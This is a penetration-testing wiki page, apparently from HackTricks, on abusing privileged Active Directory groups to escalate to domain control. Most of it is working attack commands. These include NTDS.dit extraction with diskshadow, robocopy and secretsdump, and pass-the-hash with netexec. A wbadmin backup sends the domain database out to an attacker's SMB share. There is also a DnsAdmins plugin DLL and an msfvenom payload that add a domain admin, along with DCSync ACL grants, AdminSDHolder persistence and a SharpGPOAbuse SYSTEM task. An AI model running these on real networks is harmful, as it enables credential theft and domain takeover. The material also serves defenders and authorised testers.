# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Well Known groups with administration privileges

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).

To identify the members of this group, the following command is executed:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Adding new users is permitted, as well as local login to the DC.<sup>[[1]](#references)</sup>

A conditional path from account management to local administrator access is an **ordinary group delegated to read a computer's LAPS password**. Check effective membership-write rights on that exact group, whether it is protected, and whether a new or controlled account can actually join it. Refresh the account's token before testing the target computer's LAPS read permission. For encrypted Windows LAPS, directory read permission and password-decryption authority are separate requirements; group membership or Account Operators membership alone does not establish either. See [Microsoft's Account Operators scope](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) and [Windows LAPS delegation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## AdminSDHolder group

The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.

An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.<sup>[[14]](#references)</sup>

Recent Windows Server documentation still treats several built-in operator groups as **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). The **SDProp** process runs on the **PDC Emulator** every 60 minutes by default, stamps `adminCount=1`, and disables inheritance on protected objects. This is useful both for persistence and for hunting stale privileged users that were removed from a protected group but still keep the non-inheriting ACL.<sup>[[12]](#references)</sup>

Commands to review the members and modify permissions include:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Deleted-object visibility is controlled by effective directory permissions; a group name alone does not prove that the current identity can list or restore an object. AD Recycle Bin must have been enabled before the deletion for full restore, and a restore also requires Reanimate-Tombstones on the naming-context root, rename rights, and CREATE_CHILD on the destination container. [Microsoft's Recycle Bin guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) and [undelete authorization rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) distinguish these conditions. An authorized identity with deleted-object read access can inspect records that may reveal sensitive information:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

This is useful for **recovering previous privilege paths**. Deleted objects can still expose `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, old SPNs, or the DN of a deleted privileged group that can later be restored by another operator.

Application-defined attributes may also retain old credential material while an object remains in the deleted state. Treat this as a separate review lead: the current identity must be allowed to enumerate the deleted object **and** read that attribute, the value must be a usable credential, and a still-active principal must accept it. Group membership or a deleted account name alone proves none of those steps; avoid printing credential values during routine enumeration. [Microsoft's Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) describes attribute preservation after deletion.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Domain Controller Access

Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.

### Privilege Escalation

Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.

## Backup Operators

Membership in `Backup Operators` can grant `SeBackupPrivilege` and `SeRestorePrivilege` on a host, depending on its local policy and the logon session. Check the **effective token of the process running the commands** with `whoami /groups` and `whoami /priv`: membership alone does not prove that `SeBackupPrivilege` is present and enabled. If the privilege is present but disabled, it may be enabled in that token; if it is absent or removed, these backup operations cannot use it. `SeBackupPrivilege` supports protected **reads** through backup-aware APIs (for example, `FILE_FLAG_BACKUP_SEMANTICS` or `robocopy /B`); `SeRestorePrivilege` is a separate privilege for restore/write operations. Ordinary directory listings and copies do not necessarily use backup semantics.<sup>[[1]](#references)</sup>

To list group members, execute:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Local Attack

On a host where the effective token has `SeBackupPrivilege`, the following backup-aware copy can read a protected file:

1. Import necessary libraries:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. If the privilege is present but disabled, enable it and verify its state in this process:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Copy a file from a restricted directory, for instance:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` is the Active Directory database on a **domain controller (DC)**. This path requires a suitable token on the DC and access to the volume containing the database; Backup Operators membership elsewhere does not grant access to a particular DC. A live database is normally locked, so use an accessible shadow copy or another backup facility before copying it. Creating or exposing a shadow copy also depends on the host's VSS configuration and the caller's rights. The example below assumes the DC stores `NTDS.dit` on `C:` under `\Windows\NTDS`; adjust the volume and path if it does not.

#### Using diskshadow.exe

1. If permitted, create and expose a shadow copy of the DC's `C:` drive as `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Copy `NTDS.dit` from the shadow copy:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternatively, use `robocopy` for file copying:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Save the DC's `SYSTEM` hive for offline extraction. `SAM` is the local account database on member systems; a DC's `SAM` hive is not a substitute for `NTDS.dit` or a source of the domain Administrator hash:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Transfer `ntds.dit` and `SYSTEM.SAV` to the analysis host and extract domain account hashes. A saved `SAM` hive from a member system, with its matching `SYSTEM` hive, yields local account hashes instead:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. If a **domain** Administrator hash was recovered from `NTDS.dit`, it can be tested for domain authentication. A local Administrator hash from `SAM.SAV` is a different credential and does not authenticate as the domain Administrator.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Using wbadmin.exe

1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.

To list members of the DnsAdmins group, use:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> This vulnerability allows for the execution of arbitrary code with SYSTEM privileges in the DNS service (usually inside the DCs). This issue was fixed in 2021.

Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.

### Event Log Readers
Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

If you can act as a member of this group, the classic abuse is to grant an attacker-controlled principal the replication rights needed for [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historically, **PrivExchange** chained mailbox access, coerced Exchange authentication, and LDAP relay to land on this same primitive. Even where that relay path is mitigated, direct membership in `Exchange Windows Permissions` or control of an Exchange server remains a high-value route to domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.

### Exploitation Example

The practical abuse is usually **offline access to DC disks/checkpoints** rather than old host-level LPE tricks. With access to the Hyper-V host, an operator can checkpoint or export a virtualized Domain Controller, mount the VHDX, and extract `NTDS.dit`, `SYSTEM`, and other secrets without touching LSASS inside the guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

From there, reuse the `Backup Operators` workflow to copy `Windows\NTDS\ntds.dit` and the registry hives offline. Related backup-file workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

This group allows members to create Group Policies in the domain. However, its members can't apply group policies to users or group or edit existing GPOs.

The important nuance is that the **creator becomes owner of the new GPO** and usually gets enough rights to edit it afterwards. That means this group is interesting when you can either:

- create a malicious GPO and convince an admin to link it to a target OU/domain
- edit a GPO you created that is already linked somewhere useful
- abuse another delegated right that lets you link GPOs, while this group gives you the edit side

Practical abuse normally means adding an **Immediate Task**, **startup script**, **local admin membership**, or **user rights assignment** change through SYSVOL-backed policy files.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.<sup>[[9]](#references)</sup>

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.<sup>[[1]](#references)</sup>

To list the members of this group, the following PowerShell command is used:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

On Domain Controllers this group is dangerous because the default Domain Controller Policy grants **`SeLoadDriverPrivilege`** to `Print Operators`. If you reach an elevated token for a member of this group, you can enable the privilege and load a signed-but-vulnerable driver to jump to kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> For token handling details, check [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Further insights into exploiting RDP can be found in dedicated pentesting resources.

#### Remote Management Users

Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

For exploitation techniques related to **WinRM**, specific documentation should be consulted.

#### Server Operators

This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system.<sup>[[1]](#references)</sup> To enumerate the members, the command provided is:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

On Domain Controllers, `Server Operators` commonly inherit enough rights to **reconfigure or start/stop services** and also receive `SeBackupPrivilege`/`SeRestorePrivilege` through the default DC policy. In practice, this makes them a bridge between **service-control abuse** and **NTDS extraction**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Failure to list services does not rule out access to a **known service**. The Service Control Manager checks `SC_MANAGER_ENUMERATE_SERVICE` for listing separately from `SC_MANAGER_CONNECT`; opening a named service checks its own rights, including `SERVICE_CHANGE_CONFIG` and `SERVICE_START`. Review the effective token and that service's ACL even when a general `sc.exe query` fails. Configuration rights alone are only a candidate: the service identity, start/stop rights, and a usable trigger still determine whether a higher-privilege transition is possible. See [Microsoft's service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

If a service ACL gives this group change/start rights, point the service at an arbitrary command, start it as `LocalSystem`, and then restore the original `binPath`. If service control is locked down, fall back to the `Backup Operators` techniques above to copy `NTDS.dit`.

## References

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse, Part 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll edge abuse information](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver function (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

{{#include ../../banners/hacktricks-training.md}}
